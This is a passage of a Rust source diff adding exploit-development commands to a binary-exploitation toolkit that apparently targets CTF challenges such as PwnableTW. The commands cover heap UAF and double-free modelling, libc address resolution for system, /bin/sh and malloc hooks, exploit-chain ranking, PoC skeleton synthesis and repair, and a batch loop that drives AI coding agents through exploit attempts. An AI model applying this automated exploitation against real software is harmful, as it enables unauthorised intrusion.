@@ -422,6 +422,209 @@ enum ApiCommands {
         tags: Vec<String>,
     },
 
+    /// Model heap/menu lifecycle events and report generic primitive signals.
+    HeapModel {
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// JSON event list or @path. Events use op alloc/free/edit/show/realloc with id/index/size.
+        #[arg(long)]
+        events: String,
+    },
+
+    /// Resolve libc/base arithmetic from leaks, mappings, and adjacent libc symbols.
+    LibcResolve {
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// Leaked address, e.g. 0xf7e12345.
+        #[arg(long)]
+        leak: Option<String>,
+
+        /// Symbol represented by --leak, e.g. puts, system, __libc_start_main.
+        #[arg(long)]
+        symbol: Option<String>,
+
+        /// Known libc base, if already derived.
+        #[arg(long)]
+        base: Option<String>,
+
+        /// Explicit libc/shared-object path. Defaults to adjacent libc-like .so.
+        #[arg(long)]
+        libc: Option<PathBuf>,
+
+        /// Target symbol to compute. Can be repeated. Defaults to common exploitation symbols.
+        #[arg(long = "target")]
+        targets: Vec<String>,
+    },
+
+    /// Rank generic exploit chains from proven primitives and target protections.
+    ExploitPlan {
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// Proven primitive, e.g. libc-leak, heap-leak, arbitrary-write, uaf, double-free, overflow. Can be repeated.
+        #[arg(long = "primitive")]
+        primitives: Vec<String>,
+
+        /// Known libc base, if available.
+        #[arg(long)]
+        libc_base: Option<String>,
+
+        /// Known heap base, if available.
+        #[arg(long)]
+        heap_base: Option<String>,
+    },
+
+    /// Analyze a failed PoC/verify result and emit concrete next repair steps.
+    PocRepair {
+        #[arg(value_name = "SCRIPT")]
+        script: PathBuf,
+
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// Existing exploit-verify JSON or @path. If omitted, this command runs exploit-verify.
+        #[arg(long)]
+        verify: Option<String>,
+
+        /// qemu -L sysroot exposed to the PoC when verification is run.
+        #[arg(long)]
+        sysroot: Option<PathBuf>,
+
+        /// Verification timeout when --verify is omitted.
+        #[arg(long, default_value_t = 20)]
+        timeout_secs: u64,
+
+        /// Expected target exit code when --verify is omitted.
+        #[arg(long)]
+        expect_target_exit: Option<i32>,
+
+        /// Expected output marker when --verify is omitted.
+        #[arg(long)]
+        expect_output: Option<String>,
+    },
+
+    /// Emit a generic PoC skeleton for a selected exploit chain.
+    PocSynthesize {
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// Chain family: ret2libc, arbitrary-write, uaf-fnptr, heap-hook, unlink, leak-stage.
+        #[arg(long)]
+        chain: String,
+
+        /// Proven primitive. Can be repeated.
+        #[arg(long = "primitive")]
+        primitives: Vec<String>,
+
+        /// Optional crash/control offset.
+        #[arg(long)]
+        offset: Option<usize>,
+
+        /// Known libc base.
+        #[arg(long)]
+        libc_base: Option<String>,
+
+        /// Known heap base.
+        #[arg(long)]
+        heap_base: Option<String>,
+
+        /// qemu -L sysroot baked into defaults.
+        #[arg(long)]
+        sysroot: Option<PathBuf>,
+
+        /// Write skeleton to this path. If omitted, only JSON text is emitted.
+        #[arg(long)]
+        output: Option<PathBuf>,
+    },
+
+    /// Plan payloads for constrained numeric writes such as sorted-word input.
+    ConstraintPlan {
+        /// Override the active daemon binary path.
+        #[arg(long)]
+        file: Option<PathBuf>,
+
+        /// Constraint mode: sorted-ascending, sorted-descending, avoid-null, preserve-canary.
+        #[arg(long, default_value = "sorted-ascending")]
+        mode: String,
+
+        /// Value to place. Can be repeated.
+        #[arg(long = "value")]
+        values: Vec<String>,
+
+        /// Word width in bytes.
+        #[arg(long, default_value_t = 4)]
+        width: usize,
+
+        /// Optional filler count to prepend.
+        #[arg(long, default_value_t = 0)]
+        prefix_words: usize,
+
+        /// Optional canary/reserved value that must stay in place.
+        #[arg(long)]
+        preserve: Option<String>,
+    },
+
+    /// Run or prepare exploit-loop work over a target list with consistent prompts.
+    ExploitBatchLoop {
+        /// Agent mode: prompt-pack, claude, or codex. claude/codex use interactive Agent Console.
+        #[arg(value_name = "AGENT")]
+        agent: String,
+
+        /// JSON/string file list or @path. If omitted, uses the historical PwnableTW challenge set when present.
+        #[arg(long)]
+        files: Option<String>,
+
+        /// Directory for generated PoCs.
+        #[arg(long, default_value = "/tmp/kaijulab-batch")]
+        output_dir: PathBuf,
+
+        /// Per-target exploit-loop attempts.
+        #[arg(long, default_value_t = 3)]
+        attempts: u32,
+
+        /// qemu -L sysroot for all targets where applicable.
+        #[arg(long)]
+        sysroot: Option<PathBuf>,
+
+        /// Agent console hard timeout per target.
+        #[arg(long, default_value_t = 360)]
+        timeout_secs: u64,
+
+        /// Console idle timeout per target.
+        #[arg(long, default_value_t = 45)]
+        idle_timeout_secs: u64,
+    },
+
+    /// Generate and verify offline exploit candidates without invoking an LLM.
+    AutoPwn {
+        /// JSON/string file list or @path. If omitted, uses the bundled PwnableTW benchmark set.
+        #[arg(long)]
+        files: Option<String>,
+
+        /// Directory for generated PoCs and reports.
+        #[arg(long, default_value = "/tmp/kaijulab-autopwn")]
+        output_dir: PathBuf,
+
+        /// qemu -L sysroot override for all targets where applicable.
+        #[arg(long)]
+        sysroot: Option<PathBuf>,
+
+        /// Per-candidate verification timeout.
+        #[arg(long, default_value_t = 30)]
+        timeout_secs: u64,
+
+        /// Only write candidates/reports; skip verification.
+        #[arg(long)]
+        no_verify: bool,
+    },
+
     /// Emit generic heap/menu primitive probes to try next.
     HeapProbePlan {
         /// Override the active daemon binary path.
@@ -1427,6 +1630,138 @@ async fn run_api(base_url: String, token: Option<String>, command: ApiCommands) 
                 value,
             )?
         }
+        ApiCommands::HeapModel { file, events } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            heap_model_json(&path, &events)?
+        }
+        ApiCommands::LibcResolve {
+            file,
+            leak,
+            symbol,
+            base,
+            libc,
+            targets,
+        } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            libc_resolve_json(
+                &path,
+                leak.as_deref(),
+                symbol.as_deref(),
+                base.as_deref(),
+                libc.as_deref(),
+                &targets,
+            )?
+        }
+        ApiCommands::ExploitPlan {
+            file,
+            primitives,
+            libc_base,
+            heap_base,
+        } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            exploit_plan_json(
+                &path,
+                &primitives,
+                libc_base.as_deref(),
+                heap_base.as_deref(),
+            )?
+        }
+        ApiCommands::PocRepair {
+            script,
+            file,
+            verify,
+            sysroot,
+            timeout_secs,
+            expect_target_exit,
+            expect_output,
+        } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            poc_repair_json(
+                &path,
+                &script,
+                verify.as_deref(),
+                sysroot.as_deref(),
+                timeout_secs,
+                expect_target_exit,
+                expect_output.as_deref(),
+            )?
+        }
+        ApiCommands::PocSynthesize {
+            file,
+            chain,
+            primitives,
+            offset,
+            libc_base,
+            heap_base,
+            sysroot,
+            output,
+        } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            poc_synthesize_json(
+                &path,
+                &chain,
+                &primitives,
+                offset,
+                libc_base.as_deref(),
+                heap_base.as_deref(),
+                sysroot.as_deref(),
+                output.as_deref(),
+            )?
+        }
+        ApiCommands::ConstraintPlan {
+            file,
+            mode,
+            values,
+            width,
+            prefix_words,
+            preserve,
+        } => {
+            let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
+            constraint_plan_json(
+                &path,
+                &mode,
+                &values,
+                width,
+                prefix_words,
+                preserve.as_deref(),
+            )?
+        }
+        ApiCommands::ExploitBatchLoop {
+            agent,
+            files,
+            output_dir,
+            attempts,
+            sysroot,
+            timeout_secs,
+            idle_timeout_secs,
+        } => {
+            exploit_batch_loop_json(
+                &client,
+                &base_url,
+                token.as_deref(),
+                &agent,
+                files.as_deref(),
+                &output_dir,
+                attempts,
+                sysroot.as_deref(),
+                timeout_secs,
+                idle_timeout_secs,
+            )
+            .await?
+        }
+        ApiCommands::AutoPwn {
+            files,
+            output_dir,
+            sysroot,
+            timeout_secs,
+            no_verify,
+        } => auto_pwn_json(
+            files.as_deref(),
+            &output_dir,
+            sysroot.as_deref(),
+            timeout_secs,
+            no_verify,
+        )?,
         ApiCommands::HeapProbePlan { file } => {
             let path = resolve_api_binary_path(&client, &base_url, token.as_deref(), file).await?;
             heap_probe_plan_json(&path)?
@@ -3402,6 +3737,12 @@ fn binary_facts_json(binary: &Path, max: usize) -> Result<serde_json::Value> {
             "exploit-scaffold --output /tmp/poc.py",
             "exploit-drive --actions @actions.json --expect <prompt-or-marker>",
             "leak-probe --setup @setup.json --cycle @cycle.json --want libc",
+            "heap-model --events @heap-events.json",
+            "libc-resolve --leak 0xADDR --symbol puts",
+            "exploit-plan --primitive libc-leak --primitive arbitrary-write",
+            "poc-synthesize --chain ret2libc --offset N --libc-base 0xBASE --output /tmp/poc.py",
+            "constraint-plan --mode sorted-ascending --value 0xADDR --value 0xADDR",
+            "poc-repair /tmp/poc.py --verify @verify.json",
             "heap-probe-plan",
             "runtime-run/debug-probe/exploit-verify with --save-evidence for meaningful observations"
         ],
@@ -3442,6 +3783,7 @@ fn exploit_scaffold_text(binary: &Path, runner: Option<&str>, sysroot: Option<&P
     format!(
         r#"#!/usr/bin/env python3
 import os
+import select
 import struct
 import subprocess
 import sys
@@ -3797,9 +4139,10 @@ fn action_list_from_spec(spec: &str) -> Result<Vec<serde_json::Value>> {
     let actions = value
         .get("actions")
         .and_then(|v| v.as_array())
+        .or_else(|| value.get("events").and_then(|v| v.as_array()))
         .or_else(|| value.as_array())
         .ok_or_else(|| {
-            anyhow::anyhow!("action spec must be a JSON array or object with actions[]")
+            anyhow::anyhow!("action spec must be a JSON array or object with actions[]/events[]")
         })?;
     Ok(actions.clone())
 }
@@ -4508,6 +4851,1411 @@ fn leak_want_present(
         }
         _ => false,
     }
+}
+
+#[derive(Clone, Debug)]
+struct HeapSlot {
+    allocated: bool,
+    size: Option<u64>,
+    generation: u64,
+    freed_count: u64,
+    last_tag: Option<String>,
+}
+
+fn heap_model_json(binary: &Path, events_spec: &str) -> Result<serde_json::Value> {
+    let events = action_list_from_spec(events_spec)?;
+    let mut slots: std::collections::BTreeMap<String, HeapSlot> = std::collections::BTreeMap::new();
+    let mut size_bins: std::collections::BTreeMap<u64, Vec<String>> =
+        std::collections::BTreeMap::new();
+    let mut signals = Vec::new();
+    let mut timeline = Vec::new();
+    let mut generation = 0u64;
+
+    for (idx, event) in events.iter().enumerate() {
+        let obj = event
+            .as_object()
+            .ok_or_else(|| anyhow::anyhow!("event {idx} must be an object"))?;
+        let op = obj
+            .get("op")
+            .or_else(|| obj.get("action"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("unknown")
+            .to_ascii_lowercase();
+        let id = obj
+            .get("id")
+            .or_else(|| obj.get("index"))
+            .or_else(|| obj.get("slot"))
+            .map(|v| scalar_to_string(v, idx, "id"))
+            .transpose()?
+            .unwrap_or_else(|| "0".to_string());
+        let size = obj.get("size").and_then(json_u64);
+        let tag = obj
+            .get("tag")
+            .or_else(|| obj.get("data"))
+            .and_then(|v| v.as_str())
+            .map(|s| s.to_string());
+
+        match op.as_str() {
+            "alloc" | "malloc" | "calloc" | "add" | "new" => {
+                generation += 1;
+                if slots.get(&id).is_some_and(|slot| slot.allocated) {
+                    signals.push(heap_signal(
+                        idx,
+                        "alloc_over_live_slot",
+                        &id,
+                        "allocation overwrote a still-live logical slot",
+                    ));
+                }
+                let reused_from = size.and_then(|sz| {
+                    let bin = size_bins.get_mut(&sz)?;
+                    bin.pop()
+                });
+                if let Some(prev) = &reused_from {
+                    signals.push(serde_json::json!({
+                        "event": idx,
+                        "kind": "same_size_reuse",
+                        "slot": id,
+                        "reused_freed_slot": prev,
+                        "why_it_matters": "same-size allocation reused a freed chunk candidate; compare aliases with edit/show probes"
+                    }));
+                }
+                slots.insert(
+                    id.clone(),
+                    HeapSlot {
+                        allocated: true,
+                        size,
+                        generation,
+                        freed_count: 0,
+                        last_tag: tag.clone(),
+                    },
+                );
+                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": size, "reused_from": reused_from}));
+            }
+            "free" | "delete" | "remove" => {
+                let slot = slots.entry(id.clone()).or_insert(HeapSlot {
+                    allocated: false,
+                    size,
+                    generation: 0,
+                    freed_count: 0,
+                    last_tag: None,
+                });
+                if !slot.allocated {
+                    signals.push(heap_signal(
+                        idx,
+                        "double_free_or_invalid_free",
+                        &id,
+                        "free/delete reached an already-free or never-allocated logical slot",
+                    ));
+                }
+                slot.allocated = false;
+                slot.freed_count += 1;
+                if let Some(sz) = slot.size.or(size) {
+                    size_bins.entry(sz).or_default().push(id.clone());
+                }
+                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": slot.size.or(size), "freed_count": slot.freed_count}));
+            }
+            "edit" | "write" | "update" => {
+                match slots.get_mut(&id) {
+                    Some(slot) if slot.allocated => {
+                        slot.last_tag = tag.clone();
+                    }
+                    Some(slot) => {
+                        slot.last_tag = tag.clone();
+                        signals.push(heap_signal(
+                            idx,
+                            "use_after_free_write",
+                            &id,
+                            "edit/write reached a freed logical slot",
+                        ));
+                    }
+                    None => signals.push(heap_signal(
+                        idx,
+                        "write_unknown_slot",
+                        &id,
+                        "edit/write reached a slot not seen in the modeled allocation history",
+                    )),
+                }
+                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "tag": tag}));
+            }
+            "show" | "print" | "read" => {
+                match slots.get(&id) {
+                    Some(slot) if !slot.allocated => {
+                        signals.push(heap_signal(idx, "use_after_free_read", &id, "show/print reached a freed logical slot and may leak metadata or stale function pointers"));
+                    }
+                    None => signals.push(heap_signal(
+                        idx,
+                        "read_unknown_slot",
+                        &id,
+                        "show/print reached a slot not seen in the modeled allocation history",
+                    )),
+                    _ => {}
+                }
+                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id}));
+            }
+            "realloc" => {
+                let old = slots.get(&id).cloned();
+                if matches!(size, Some(0)) {
+                    signals.push(heap_signal(idx, "realloc_zero_lifetime_edge", &id, "realloc(slot, 0) often frees storage while programs accidentally keep the old pointer"));
+                }
+                if old.as_ref().is_some_and(|slot| !slot.allocated) {
+                    signals.push(heap_signal(
+                        idx,
+                        "realloc_freed_slot",
+                        &id,
+                        "realloc reached a freed logical slot",
+                    ));
+                }
+                generation += 1;
+                slots.insert(
+                    id.clone(),
+                    HeapSlot {
+                        allocated: !matches!(size, Some(0)),
+                        size,
+                        generation,
+                        freed_count: old.map(|slot| slot.freed_count).unwrap_or(0),
+                        last_tag: tag.clone(),
+                    },
+                );
+                timeline.push(serde_json::json!({"event": idx, "op": op, "id": id, "size": size}));
+            }
+            _ => {
+                signals.push(serde_json::json!({
+                    "event": idx,
+                    "kind": "unknown_event",
+                    "op": op,
+                    "next_action": "Normalize this transcript event to alloc/free/edit/show/realloc so heap-model can reason about it."
+                }));
+            }
+        }
+    }
+
+    let slot_values: Vec<_> = slots
+        .iter()
+        .map(|(id, slot)| {
+            serde_json::json!({
+                "id": id,
+                "allocated": slot.allocated,
+                "size": slot.size,
+                "generation": slot.generation,
+                "freed_count": slot.freed_count,
+                "last_tag": slot.last_tag,
+            })
+        })
+        .collect();
+    let suggested = heap_model_next_steps(&signals);
+    Ok(serde_json::json!({
+        "kind": "heap_model",
+        "binary": binary,
+        "events": events.len(),
+        "slots": slot_values,
+        "signals": signals,
+        "suggested_probes": suggested,
+        "next_action": "Convert the highest-confidence signal into an exploit-drive probe that proves aliasing, UAF read/write, or duplicate allocation before writing the final PoC."
+    }))
+}
+
+fn heap_signal(event: usize, kind: &str, slot: &str, why: &str) -> serde_json::Value {
+    serde_json::json!({
+        "event": event,
+        "kind": kind,
+        "slot": slot,
+        "why_it_matters": why,
+    })
+}
+
+fn heap_model_next_steps(signals: &[serde_json::Value]) -> Vec<serde_json::Value> {
+    let has = |needle: &str| {
+        signals.iter().any(|s| {
+            s.get("kind")
+                .and_then(|v| v.as_str())
+                .is_some_and(|kind| kind == needle)
+        })
+    };
+    let mut out = Vec::new();
+    if has("double_free_or_invalid_free") || has("same_size_reuse") {
+        out.push(serde_json::json!({
+            "goal": "prove duplicate allocation or alias",
+            "probe": "allocate A/B, free A/B/A when legal, allocate twice with distinct marker tags, then show/edit both logical slots",
+            "success_signal": "editing one logical slot changes the other, or two allocations expose identical content/pointer behavior"
+        }));
+    }
+    if has("use_after_free_read") {
+        out.push(serde_json::json!({
+            "goal": "turn UAF read into leak",
+            "probe": "free a chunk, trigger show/print on the stale slot, classify output with leak-probe/libc-resolve",
+            "success_signal": "printed bytes contain mapped pointer candidate or libc/heap address"
+        }));
+    }
+    if has("use_after_free_write") {
+        out.push(serde_json::json!({
+            "goal": "turn UAF write into control",
+            "probe": "reallocate freed storage with pointer-sized marker, then trigger the stale callback/show/free path under debug-probe",
+            "success_signal": "pc/eip/rip or dereferenced pointer reaches the marker-controlled value"
+        }));
+    }
+    if has("realloc_zero_lifetime_edge") || has("realloc_freed_slot") {
+        out.push(serde_json::json!({
+            "goal": "prove realloc stale pointer",
+            "probe": "realloc(slot, 0), then show/edit/free the same logical slot and compare against a fresh same-size allocation",
+            "success_signal": "stale slot remains reachable after realloc freed or moved its backing chunk"
+        }));
+    }
+    if out.is_empty() {
+        out.push(serde_json::json!({
+            "goal": "complete lifecycle map",
+            "probe": "record alloc/free/edit/show/realloc events with stable ids and sizes, then rerun heap-model",
+            "success_signal": "model emits UAF, double-free, same-size reuse, or realloc lifetime signals"
+        }));
+    }
+    out
+}
+
+fn libc_resolve_json(
+    binary: &Path,
+    leak: Option<&str>,
+    symbol: Option<&str>,
+    base: Option<&str>,
+    explicit_libc: Option<&Path>,
+    targets: &[String],
+) -> Result<serde_json::Value> {
+    let libc = select_libc_path(binary, explicit_libc)?;
+    let offsets = shared_object_symbol_offsets(&libc)?;
+    let symbols = offsets
+        .get("symbols")
+        .and_then(|v| v.as_object())
+        .cloned()
+        .unwrap_or_default();
+    let base_value = if let Some(base) = base {
+        Some(parse_hex_u64(base).with_context(|| format!("parse --base {base}"))?)
+    } else if let (Some(leak), Some(symbol)) = (leak, symbol) {
+        let leak_value = parse_hex_u64(leak).with_context(|| format!("parse --leak {leak}"))?;
+        let offset = symbol_offset_from_map(&symbols, symbol)
+            .ok_or_else(|| anyhow::anyhow!("symbol '{symbol}' not found in {}", libc.display()))?;
+        Some(leak_value.wrapping_sub(offset))
+    } else {
+        None
+    };
+    let target_names = if targets.is_empty() {
+        vec![
+            "system".to_string(),
+            "exit".to_string(),
+            "__free_hook".to_string(),
+            "__malloc_hook".to_string(),
+            "str_bin_sh".to_string(),
+            "environ".to_string(),
+        ]
+    } else {
+        targets.to_vec()
+    };
+    let resolved: Vec<_> = target_names
+        .iter()
+        .map(|name| {
+            let offset = symbol_offset_from_map(&symbols, name);
+            serde_json::json!({
+                "symbol": name,
+                "offset": offset.map(|v| format!("0x{v:x}")),
+                "address": base_value.and_then(|base| offset.map(|off| format!("0x{:x}", base + off))),
+            })
+        })
+        .collect();
+    Ok(serde_json::json!({
+        "kind": "libc_resolve",
+        "binary": binary,
+        "libc": libc,
+        "leak": leak,
+        "leak_symbol": symbol,
+        "libc_base": base_value.map(|v| format!("0x{v:x}")),
+        "resolved": resolved,
+        "available_symbols": symbols,
+        "next_action": if base_value.is_some() {
+            "Use resolved addresses in the next PoC stage and verify with exploit-verify; prefer a deterministic exit/output predicate."
+        } else {
+            "Provide --leak and --symbol, or --base, then rerun libc-resolve to materialize final-stage addresses."
+        },
+    }))
+}
+
+fn exploit_plan_json(
+    binary: &Path,
+    primitives: &[String],
+    libc_base: Option<&str>,
+    heap_base: Option<&str>,
+) -> Result<serde_json::Value> {
+    let context = build_exploit_context(binary, 8)?;
+    let protections = context.get("protections").cloned().unwrap_or_default();
+    let primitive_set: std::collections::BTreeSet<String> = primitives
+        .iter()
+        .map(|p| p.to_ascii_lowercase().replace('_', "-"))
+        .collect();
+    let has = |p: &str| primitive_set.contains(p);
+    let relro = protections
+        .get("relro")
+        .and_then(|v| v.as_str())
+        .unwrap_or("unknown");
+    let pie = protections
+        .get("pie")
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false);
+    let canary = protections
+        .get("canary_import")
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false);
+    let libc_known = libc_base.and_then(|s| parse_hex_u64(s).ok()).is_some();
+    let heap_known = heap_base.and_then(|s| parse_hex_u64(s).ok()).is_some();
+    let mut chains = Vec::new();
+
+    if (has("arbitrary-write") || has("write-what-where")) && libc_known {
+        let target = if relro != "full" {
+            "GOT overwrite or __free_hook/system depending on call path"
+        } else {
+            "__free_hook/system, __malloc_hook gadget, vtable/callback, or FILE/exit structure"
+        };
+        chains.push(serde_json::json!({
+            "rank": chains.len() + 1,
+            "name": "libc-resolved arbitrary write",
+            "requires": ["arbitrary-write", "libc-base"],
+            "target": target,
+            "steps": [
+                "Use libc-resolve to materialize system, /bin/sh, hooks, and exit.",
+                "Write selected target address with the proven primitive.",
+                "Trigger the corresponding free/malloc/callback/exit path.",
+                "Verify with returncode=42 or exact command marker."
+            ],
+            "risks": ["hook availability varies by libc", "full RELRO blocks GOT overwrite"]
+        }));
+    }
+    if (has("uaf") || has("double-free") || has("tcache") || has("fastbin")) && !libc_known {
+        chains.push(serde_json::json!({
+            "rank": chains.len() + 1,
+            "name": "heap primitive to libc leak",
+            "requires": ["heap-lifecycle signal"],
+            "target": "freed metadata, GOT pointer, FILE pointer, or /proc/self/maps",
+            "steps": [
+                "Use heap-model to prove the lifecycle bug as UAF read, duplicate allocation, or overlap.",
+                "Use leak-probe or a show primitive to harvest mapped pointers.",
+                "Run libc-resolve with the leaked symbol/base before final overwrite."
+            ],
+            "risks": ["safe-linking/tcache version may require heap base", "printed data may truncate at NUL"]
+        }));
+    }
+    if has("overflow") || has("stack-overflow") || has("rop") {
+        chains.push(serde_json::json!({
+            "rank": chains.len() + 1,
+            "name": "stack control to leak/ROP",
+            "requires": ["offset", if canary { "canary leak" } else { "no canary or bypass" }],
+            "target": if libc_known { "ret2libc final chain" } else { "stage-1 PLT/GOT leak then final chain" },
+            "steps": [
+                "Run crash-offset/debug-probe to confirm control and exact offset.",
+                "If canary is present, establish leak before writing return state.",
+                "Leak libc when needed, return to a stable input state, then send final chain."
+            ],
+            "risks": ["PIE requires binary base leak", "stack alignment differs on x86_64"]
+        }));
+    }
+    if has("unlink") || has("linked-list") {
+        chains.push(serde_json::json!({
+            "rank": chains.len() + 1,
+            "name": "linked-structure write-what-where",
+            "requires": ["controllable node pointers", "delete/unlink trigger"],
+            "target": if relro == "full" { "stack/control structure after leak" } else { "GOT entry or stack control word" },
+            "steps": [
+                "Recover node layout with decompile-enhanced around add/list/delete.",
+                "Craft fake node fields, trigger delete/unlink once, and observe write target.",
+                "Use first write for leak or final control depending on ASLR/protections."
+            ],
+            "risks": ["integrity checks may constrain next/prev", "bad target can terminate before verifier predicate"]
+        }));
+    }
+    if chains.is_empty() {
+        chains.push(serde_json::json!({
+            "rank": 1,
+            "name": "missing primitive proof",
+            "requires": ["one concrete leak/read/write/control primitive"],
+            "target": "next observation, not final exploit",
+            "steps": [
+                "Use exploit-drive to map menu states.",
+                "Use heap-model for lifecycle transcripts or crash-offset for overflow input.",
+                "Use leak-probe/libc-resolve once any pointer-like output appears."
+            ],
+            "risks": ["writing a final PoC before proving a primitive causes attempt churn"]
+        }));
+    }
+    Ok(serde_json::json!({
+        "kind": "exploit_plan",
+        "binary": binary,
+        "protections": protections,
+        "primitives": primitive_set,
+        "libc_base_known": libc_known,
+        "heap_base_known": heap_known,
+        "pie": pie,
+        "canary": canary,
+        "ranked_chains": chains,
+        "next_action": "Execute the first chain's first unproven prerequisite with exploit-drive, leak-probe, debug-probe, or exploit-verify; do not skip directly to final overwrite."
+    }))
+}
+
+fn poc_repair_json(
+    binary: &Path,
+    script: &Path,
+    verify_spec: Option<&str>,
+    sysroot: Option<&Path>,
+    timeout_secs: u64,
+    expect_target_exit: Option<i32>,
+    expect_output: Option<&str>,
+) -> Result<serde_json::Value> {
+    let verify = if let Some(spec) = verify_spec {
+        read_json_or_inline(spec)?
+    } else {
+        verify_exploit_script(
+            script,
+            binary,
+            timeout_secs,
+            None,
+            expect_target_exit,
+            expect_output,
+            sysroot,
+            &[],
+        )?
+    };
+    let stdout = verify.get("stdout").and_then(|v| v.as_str()).unwrap_or("");
+    let stderr = verify.get("stderr").and_then(|v| v.as_str()).unwrap_or("");
+    let combined = format!("{stdout}\n{stderr}");
+    let script_text = std::fs::read_to_string(script).unwrap_or_default();
+    let mut diagnoses = Vec::new();
+    if verify
+        .get("success")
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false)
+    {
+        diagnoses.push(serde_json::json!({"kind": "already_successful", "repair": "No repair needed; preserve this PoC and report SCRIPT_READY."}));
+    }
+    if verify
+        .get("timed_out")
+        .and_then(|v| v.as_bool())
+        .unwrap_or(false)
+        || combined.to_ascii_lowercase().contains("timeout")
+    {
+        diagnoses.push(serde_json::json!({"kind": "timeout_or_menu_desync", "repair": "Replace raw communicate/read loops with recv_until/sendline_after-equivalent logic; first reproduce transcript using exploit-drive."}));
+    }
+    if combined.contains("No such file or directory")
+        || combined.contains("not found")
+        || combined.contains("ld-linux")
+    {
+        diagnoses.push(serde_json::json!({"kind": "loader_or_path", "repair": "Use KAIJU_BINARY/KAIJULAB_BINARY and KAIJU_SYSROOT/KAIJULAB_SYSROOT, and spawn qemu with -L sysroot for foreign arch."}));
+    }
+    if combined.contains("SCRIPT_READY_BLOCKED") {
+        diagnoses.push(serde_json::json!({"kind": "blocked_marker_misuse", "repair": "Do not use SCRIPT_READY_BLOCKED for exploit difficulty; continue with structured primitive proof or environment fix."}));
+    }
+    if combined.contains("returncode=")
+        && !verify
+            .get("success")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false)
+    {
+        diagnoses.push(serde_json::json!({"kind": "wrong_exit_predicate", "repair": "Make the target child exit with the expected code or rerun exploit-verify with the predicate the PoC actually proves."}));
+    }
+    if combined.contains("SIGSEGV")
+        || combined.contains("Segmentation fault")
+        || combined.contains("signal")
+    {
+        diagnoses.push(serde_json::json!({"kind": "crash_without_control_proof", "repair": "Run debug-probe or crash-offset with the same input; repair offset/register target before adding libc stages."}));
+    }
+    if script_text.contains("TODO") || script_text.contains("pass\n") {
+        diagnoses.push(serde_json::json!({"kind": "incomplete_scaffold", "repair": "Fill the scaffold transcript first; use exploit-drive output to copy stable menu actions into the PoC."}));
+    }
+    if script_text.contains("p64(") && script_text.contains("i386") {
+        diagnoses.push(serde_json::json!({"kind": "word_size_mismatch", "repair": "Use p32 for i386 targets unless intentionally writing 64-bit data into a file or protocol."}));
+    }
+    if !script_text.contains("KAIJU_SYSROOT") && !script_text.contains("KAIJULAB_SYSROOT") {
+        diagnoses.push(serde_json::json!({"kind": "missing_sysroot_env", "repair": "Read KAIJU_SYSROOT/KAIJULAB_SYSROOT in the PoC so exploit-verify and exploit-loop use the same loader environment."}));
+    }
+    if diagnoses.is_empty() {
+        diagnoses.push(serde_json::json!({"kind": "needs_narrower_observation", "repair": "Use exploit-plan to identify the first unproven primitive, then add one debug/leak/drive probe before editing final payload bytes."}));
+    }
+    Ok(serde_json::json!({
+        "kind": "poc_repair",
+        "binary": binary,
+        "script": script,
+        "verify": verify,
+        "diagnoses": diagnoses,
+        "next_action": "Apply exactly one repair, rerun exploit-verify with an explicit predicate, then feed the new result back into poc-repair if it still fails."
+    }))
+}
+
+fn poc_synthesize_json(
+    binary: &Path,
+    chain: &str,
+    primitives: &[String],
+    offset: Option<usize>,
+    libc_base: Option<&str>,
+    heap_base: Option<&str>,
+    sysroot: Option<&Path>,
+    output: Option<&Path>,
+) -> Result<serde_json::Value> {
+    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
+    let arch = binary_arch_from_data(&data).unwrap_or_else(|| "unknown".to_string());
+    let interpreter = binary_interpreter_from_data(&data);
+    let effective_sysroot = effective_sysroot(sysroot, Some(&arch), interpreter.as_deref());
+    let runner = default_runner_for_arch(Some(&arch));
+    let libc = select_libc_path(binary, None).ok();
+    let symbols = libc
+        .as_deref()
+        .and_then(|path| shared_object_symbol_offsets(path).ok())
+        .and_then(|v| v.get("symbols").and_then(|s| s.as_object()).cloned())
+        .unwrap_or_default();
+    let text = poc_skeleton_text(
+        binary,
+        chain,
+        primitives,
+        &arch,
+        runner.as_deref(),
+        effective_sysroot.as_deref(),
+        offset,
+        libc_base,
+        heap_base,
+        &symbols,
+    )?;
+    if let Some(output) = output {
+        std::fs::write(output, &text).with_context(|| format!("write {}", output.display()))?;
+    }
+    Ok(serde_json::json!({
+        "kind": "poc_synthesize",
+        "binary": binary,
+        "chain": chain,
+        "primitives": primitives,
+        "arch": arch,
+        "runner": runner,
+        "sysroot": effective_sysroot.as_deref(),
+        "adjacent_libc": libc,
+        "output": output,
+        "text": text,
+        "next_action": "Fill only the transcript/primitive-specific TODOs, then run exploit-verify with an explicit predicate and feed failures to poc-repair."
+    }))
+}
+
+fn poc_skeleton_text(
+    binary: &Path,
+    chain: &str,
+    primitives: &[String],
+    arch: &str,
+    runner: Option<&str>,
+    sysroot: Option<&Path>,
+    offset: Option<usize>,
+    libc_base: Option<&str>,
+    heap_base: Option<&str>,
+    symbols: &serde_json::Map<String, serde_json::Value>,
+) -> Result<String> {
+    let width = if arch == "x86_64" { 8 } else { 4 };
+    let packer = if width == 8 { "p64" } else { "p32" };
+    let offset = offset.unwrap_or(0);
+    let qemu_default = runner.unwrap_or("");
